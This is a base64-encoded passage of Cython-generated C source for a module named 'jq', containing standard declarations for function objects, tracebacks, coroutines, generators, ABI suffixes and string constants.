IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwoZikgKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZiktPmZ1bmNfdmVjdG9yY2FsbClcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGYpICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmKS0+dmVjdG9yY2FsbClcbiNlbmRpZlxuI2VuZGlmXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9DeUZ1bmN0aW9uX05ldyhQeU1ldGhvZERlZiAqbWwsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKmdsb2JhbHMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0KiBjb2RlKTtcblxuXG4jaWYgQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSyAmJiBDWVRIT05fQ0xJTkVfSU5fVFJBQ0VCQUNLX1JVTlRJTUVcbnN0YXRpYyBpbnQgX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2soUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBpbnQgY19saW5lKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0NMaW5lRm9yVHJhY2ViYWNrKHRzdGF0ZSwgY19saW5lKSAgKCgoQ1lUSE9OX0NMSU5FX0lOX1RSQUNFQkFDSykpID8gY19saW5lIDogMClcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG50eXBlZGVmIFB5T2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlO1xuI2Vsc2VcbnR5cGVkZWYgUHlDb2RlT2JqZWN0IF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlO1xuI2VuZGlmXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgX19QeXhfQ2FjaGVkQ29kZU9iamVjdFR5cGUqIGNvZGVfb2JqZWN0O1xuICAgIGludCBjb2RlX2xpbmU7XG59IF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5O1xuc3RydWN0IF9fUHl4X0NvZGVPYmplY3RDYWNoZSB7XG4gICAgaW50IGNvdW50O1xuICAgIGludCBtYXhfY291bnQ7XG4gICAgX19QeXhfQ29kZU9iamVjdENhY2hlRW50cnkqIGVudHJpZXM7XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgIF9fcHl4X2F0b21pY19pbnRfdHlwZSBhY2Nlc3Nvcl9jb3VudDtcbiAgI2VuZGlmXG59O1xuc3RhdGljIGludCBfX3B5eF9iaXNlY3RfY29kZV9vYmplY3RzKF9fUHl4X0NvZGVPYmplY3RDYWNoZUVudHJ5KiBlbnRyaWVzLCBpbnQgY291bnQsIGludCBjb2RlX2xpbmUpO1xuc3RhdGljIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlICpfX3B5eF9maW5kX2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUpO1xuc3RhdGljIHZvaWQgX19weXhfaW5zZXJ0X2NvZGVfb2JqZWN0KGludCBjb2RlX2xpbmUsIF9fUHl4X0NhY2hlZENvZGVPYmplY3RUeXBlKiBjb2RlX29iamVjdCk7XG5cblxuc3RhdGljIHZvaWQgX19QeXhfQWRkVHJhY2ViYWNrKGNvbnN0IGNoYXIgKmZ1bmNuYW1lLCBpbnQgY19saW5lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCBweV9saW5lLCBjb25zdCBjaGFyICpmaWxlbmFtZSk7XG5cblxuI2lmICFkZWZpbmVkKF9fSU5URUxfQ09NUElMRVIpICYmIGRlZmluZWQoX19HTlVDX18pICYmIChfX0dOVUNfXyA+IDQgfHwgKF9fR05VQ19fID09IDQgJiYgX19HTlVDX01JTk9SX18gPj0gNikpXG4jZGVmaW5lIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQ1xuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgbG9uZyBfX1B5eF9QeUxvbmdfQXNfbG9uZyhQeU9iamVjdCAqKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxudHlwZWRlZiBQeU9iamVjdCAqX19QeXhfVHlwZU5hbWU7XG4jZGVmaW5lIF9fUHl4X0ZNVF9UWVBFTkFNRSAiJVUiXG4jZGVmaW5lIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmopIFB5X1hERUNSRUYob2JqKVxuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lIFB5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWVcbiNlbHNlXG5zdGF0aWMgX19QeXhfVHlwZU5hbWUgX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeVR5cGVPYmplY3QqIHRwKTtcbiNlbmRpZlxuI2Vsc2UgIC8vICFMSU1JVEVEX0FQSVxudHlwZWRlZiBjb25zdCBjaGFyICpfX1B5eF9UeXBlTmFtZTtcbiNkZWZpbmUgX19QeXhfRk1UX1RZUEVOQU1FICIlLjIwMHMiXG4jZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUodHApICgodHApLT50cF9uYW1lKVxuI2RlZmluZSBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqKVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Bc19pbnQoUHlPYmplY3QgKik7XG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBfX1B5eF9Jc1N1YnR5cGUoUHlfVFlQRShvYmopLCAoUHlUeXBlT2JqZWN0ICopdHlwZSlcbiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgX19QeXhfSXNBbnlTdWJ0eXBlMihQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlMSwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzU3VidHlwZShQeVR5cGVPYmplY3QgKmEsIFB5VHlwZU9iamVjdCAqYik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNBbnlTdWJ0eXBlMihQeVR5cGVPYmplY3QgKmNscywgUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZSk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZTEsIFB5T2JqZWN0ICp0eXBlMik7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZSlcbiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgKFB5T2JqZWN0X1R5cGVDaGVjayhvYmosIChQeVR5cGVPYmplY3QgKil0eXBlMSkgfHwgUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKSlcbiNkZWZpbmUgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSkgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZSlcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKSB7XG4gICAgcmV0dXJuIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUxKSB8fCBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCB0eXBlMik7XG59XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlczIoZXJyMSwgZXJyMikgIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoX19QeXhfUHlFcnJfQ3VycmVudEV4Y2VwdGlvblR5cGUoKSwgZXJyMSwgZXJyMilcbiNkZWZpbmUgX19QeXhfUHlFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19FeGNlcHRpb24pXG4jaWZkZWYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVja1xuICAjZGVmaW5lIF9fUHl4X1B5QmFzZUV4Y2VwdGlvbl9DaGVjayhvYmopIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sob2JqKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeUJhc2VFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19CYXNlRXhjZXB0aW9uKVxuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2UoUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiLCBQeU9iamVjdCAqY2F1c2UpO1xuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfR2V0QnVpbHRpbk5leHRfTGltaXRlZEFQSSh2b2lkKTtcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMsIGludCBpdGVybmV4dCk7XG5cblxuc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdDtcbnR5cGVkZWYgUHlPYmplY3QgKigqX19weXhfY29yb3V0aW5lX2JvZHlfdCkoc3RydWN0IF9fcHl4X0Nvcm91dGluZU9iamVjdCAqLCBQeVRocmVhZFN0YXRlICosIFB5T2JqZWN0ICopO1xuI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiNkZWZpbmUgX19QeXhfRXhjSW5mb1N0cnVjdCAgX1B5RXJyX1N0YWNrSXRlbVxuI2Vsc2VcbnR5cGVkZWYgc3RydWN0IHtcbiAgICBQeU9iamVjdCAqZXhjX3R5cGU7XG4gICAgUHlPYmplY3QgKmV4Y192YWx1ZTtcbiAgICBQeU9iamVjdCAqZXhjX3RyYWNlYmFjaztcbn0gX19QeXhfRXhjSW5mb1N0cnVjdDtcbiNlbmRpZlxudHlwZWRlZiBzdHJ1Y3QgX19weXhfQ29yb3V0aW5lT2JqZWN0IHtcbiAgICBQeU9iamVjdF9IRUFEXG4gICAgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5O1xuICAgIFB5T2JqZWN0ICpjbG9zdXJlO1xuICAgIF9fUHl4X0V4Y0luZm9TdHJ1Y3QgZ2lfZXhjX3N0YXRlO1xuICAgIFB5T2JqZWN0ICpnaV93ZWFrcmVmbGlzdDtcbiAgICBQeU9iamVjdCAqY2xhc3NvYmo7XG4gICAgUHlPYmplY3QgKnlpZWxkZnJvbTtcbiAgICBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgeWllbGRmcm9tX2FtX3NlbmQ7XG4gICAgUHlPYmplY3QgKmdpX25hbWU7XG4gICAgUHlPYmplY3QgKmdpX3F1YWxuYW1lO1xuICAgIFB5T2JqZWN0ICpnaV9tb2R1bGVuYW1lO1xuICAgIFB5T2JqZWN0ICpnaV9jb2RlO1xuICAgIFB5T2JqZWN0ICpnaV9mcmFtZTtcbiNpZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HICYmIChDWVRIT05fUFJPRklMRSB8fCBDWVRIT05fVFJBQ0UpXG4gICAgUHlNb25pdG9yaW5nU3RhdGUgX19weXhfcHltb25pdG9yaW5nX3N0YXRlW19fUHl4X01vbml0b3JpbmdFdmVudFR5cGVzX0N5R2VuX2NvdW50XTtcbiAgICB1aW50NjRfdCBfX3B5eF9weW1vbml0b3JpbmdfdmVyc2lvbjtcbiNlbmRpZlxuICAgIGludCByZXN1bWVfbGFiZWw7XG4gICAgY2hhciBpc19ydW5uaW5nO1xufSBfX3B5eF9Db3JvdXRpbmVPYmplY3Q7XG5zdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ldyhcbiAgICBQeVR5cGVPYmplY3QgKnR5cGUsIF9fcHl4X2Nvcm91dGluZV9ib2R5X3QgYm9keSwgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjbG9zdXJlLFxuICAgIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcXVhbG5hbWUsIFB5T2JqZWN0ICptb2R1bGVfbmFtZSk7XG5zdGF0aWMgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX1B5eF9fQ29yb3V0aW5lX05ld0luaXQoXG4gICAgICAgICAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiwgX19weXhfY29yb3V0aW5lX2JvZHlfdCBib2R5LCBQeU9iamVjdCAqY29kZSwgUHlPYmplY3QgKmNsb3N1cmUsXG4gICAgICAgICAgICBQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKnF1YWxuYW1lLCBQeU9iamVjdCAqbW9kdWxlX25hbWUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9Db3JvdXRpbmVfRXhjZXB0aW9uQ2xlYXIoX19QeXhfRXhjSW5mb1N0cnVjdCAqc2VsZik7XG5zdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9jbGVhcihQeU9iamVjdCAqc2VsZik7XG5zdGF0aWMgX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9BbVNlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKipyZXR2YWwpO1xuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Db3JvdXRpbmVfU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlKTtcbnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQgX19QeXhfQ29yb3V0aW5lX0Nsb3NlKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqKnJldHZhbCk7XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqZ2VuLCBQeU9iamVjdCAqYXJncyk7XG4jaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfU3dhcEV4Y2VwdGlvbihzZWxmKVxuI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihzZWxmKSAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKCYoc2VsZiktPmdpX2V4Y19zdGF0ZSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9Td2FwRXhjZXB0aW9uKHNlbGYpIHtcXFxuICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJihzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3ZhbHVlLCAmKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3RyYWNlYmFjayk7XFxcbiAgICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKCYoc2VsZiktPmdpX2V4Y19zdGF0ZSk7XFxcbiAgICB9XG4jZGVmaW5lIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKHNlbGYpIHtcXFxuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190eXBlLCAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUsIChzZWxmKS0+Z2lfZXhjX3N0YXRlLmV4Y190cmFjZWJhY2spO1xcXG4gICAgKHNlbGYpLT5naV9leGNfc3RhdGUuZXhjX3R5cGUgPSAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdmFsdWUgPSAoc2VsZiktPmdpX2V4Y19zdGF0ZS5leGNfdHJhY2ViYWNrID0gTlVMTDtcXFxuICAgIH1cbiNlbmRpZlxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuI2RlZmluZSBfX1B5eF9QeUdlbl9GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShwdmFsdWUpXFxcbiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19weXhfdHN0YXRlLCBwdmFsdWUpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUdlbl9GZXRjaFN0b3BJdGVyYXRpb25WYWx1ZShwdmFsdWUpXFxcbiAgICBfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCBwdmFsdWUpXG4jZW5kaWZcbnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9Db3JvdXRpbmVfUmVzZXRGcmFtZUJhY2twb2ludGVyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSk7XG5zdGF0aWMgY2hhciBfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pO1xuc3RhdGljIHZvaWQgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pO1xuc3RhdGljIGNoYXIgX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKTtcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2dldF9pc19ydW5uaW5nX2dldHRlcihQeU9iamVjdCAqZ2VuLCB2b2lkICpjbG9zdXJlKTtcbiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG5zdGF0aWMgdm9pZCBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQoUHlUeXBlT2JqZWN0ICp0eXBlLCBfX1B5eF9QeUFzeW5jTWV0aG9kc1N0cnVjdCAqc3RhdGljX2Ftc2VuZF9tZXRob2RzLCBfX1B5eF9weWl0ZXJfc2VuZGZ1bmMgYW1fc2VuZCk7XG4jZW5kaWZcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX2ZhaWxfcmVkdWNlX2V4KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnKTtcblxuXG4jZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4jZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KG9iaikgX19QeXhfSVNfVFlQRShvYmosIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X0dlbmVyYXRvclR5cGUpXG4jZGVmaW5lIF9fUHl4X0dlbmVyYXRvcl9OZXcoYm9keSwgY29kZSwgY2xvc3VyZSwgbmFtZSwgcXVhbG5hbWUsIG1vZHVsZV9uYW1lKVxcXG4gICAgX19QeXhfX0Nvcm91dGluZV9OZXcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfR2VuZXJhdG9yVHlwZSwgYm9keSwgY29kZSwgY2xvc3VyZSwgbmFtZSwgcXVhbG5hbWUsIG1vZHVsZV9uYW1lKVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfTmV4dChQeU9iamVjdCAqc2VsZik7XG5zdGF0aWMgaW50IF9fcHl4X0dlbmVyYXRvcl9pbml0KFB5T2JqZWN0ICptb2R1bGUpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9HZXRJbmxpbmVkUmVzdWx0KFB5T2JqZWN0ICpzZWxmKTtcblxuXG5zdGF0aWMgdW5zaWduZWQgbG9uZyBfX1B5eF9nZXRfcnVudGltZV92ZXJzaW9uKHZvaWQpO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcik7XG5cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlKHZvaWQqKTtcbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfQWRkTW9kdWxlKFB5T2JqZWN0KiBtb2R1bGUsIHZvaWQqKTtcbnN0YXRpYyBpbnQgX19QeXhfU3RhdGVfUmVtb3ZlTW9kdWxlKHZvaWQqKTtcbiNlbGlmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG4jZGVmaW5lIF9fUHl4X1N0YXRlX0ZpbmRNb2R1bGUgUHlTdGF0ZV9GaW5kTW9kdWxlXG4jZGVmaW5lIF9fUHl4X1N0YXRlX0FkZE1vZHVsZSBQeVN0YXRlX0FkZE1vZHVsZVxuI2RlZmluZSBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUgUHlTdGF0ZV9SZW1vdmVNb2R1bGVcbiNlbmRpZlxuXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAjaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICAgICAgI2RlZmluZSBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYICAiX2Zhc3RjYWxsIlxuICAgICNlbHNlXG4gICAgICAgICNkZWZpbmUgX19QWVhfRkFTVENBTExfQUJJX1NVRkZJWFxuICAgICNlbmRpZlxuICAgICNkZWZpbmUgX19QWVhfTElNSVRFRF9BQklfU1VGRklYICJsaW1pdGVkIiBfX1BZWF9GQVNUQ0FMTF9BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWFxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWFxuI2VuZGlmXG4jaWYgX19QWVhfSEFTX1BZX0FNX1NFTkQgPT0gMVxuICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYXG4jZWxpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyXG4gICAgI2RlZmluZSBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVggImFtc2VuZGJhY2twb3J0IlxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWCAibm9hbXNlbmQiXG4jZW5kaWZcbiNpZm5kZWYgX19QWVhfTU9OSVRPUklOR19BQklfU1VGRklYXG4gICAgI2RlZmluZSBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVhcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgICAjZGVmaW5lIF9fUFlYX1RQX0ZJTkFMSVpFX0FCSV9TVUZGSVhcbiNlbHNlXG4gICAgI2RlZmluZSBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYICJub2ZpbmFsaXplIlxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMgfHwgIWRlZmluZWQoX19QeXhfQXN5bmNHZW5fVVNFRClcbiAgICAjZGVmaW5lIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYXG4jZWxzZVxuICAgICNkZWZpbmUgX19QWVhfRlJFRUxJU1RTX0FCSV9TVUZGSVggIm5vZnJlZWxpc3RzIlxuI2VuZGlmXG4jZGVmaW5lIENZVEhPTl9BQkkgIF9fUFlYX0FCSV9WRVJTSU9OIF9fUFlYX0xJTUlURURfQUJJX1NVRkZJWCBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVggX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWCBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWCBfX1BZWF9BTV9TRU5EX0FCSV9TVUZGSVhcbiNkZWZpbmUgX19QWVhfQUJJX01PRFVMRV9OQU1FICJfY3l0aG9uXyIgQ1lUSE9OX0FCSVxuI2RlZmluZSBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggX19QWVhfQUJJX01PRFVMRV9OQU1FICIuIlxuXG5cblxuXG5cbiNkZWZpbmUgX19QeXhfTU9EVUxFX05BTUUgImpxIlxuZXh0ZXJuIGludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl9qcTtcbmludCBfX3B5eF9tb2R1bGVfaXNfbWFpbl9qcSA9IDA7XG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fcHJpbnQ7XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5faW5wdXQ7XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X2J1aWx0aW5fb3BlbjtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9yYW5nZTtcblxuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19bXSA9ICJcXG5cXG5cXG4iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18wW10gPSAiMCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFbXSA9ICIxIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfNFtdID0gIjQiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hW10gPSAiYSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2JbXSA9ICJiIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZVtdID0gImUiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19mW10gPSAiZiI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lbXSA9ICJpIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfa1tdID0gImsiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tW10gPSAibSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX29bXSA9ICJvIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcVtdID0gIlxcMjIwcSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JbXSA9ICJyIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdFtdID0gInQiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa193W10gPSAidyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3hb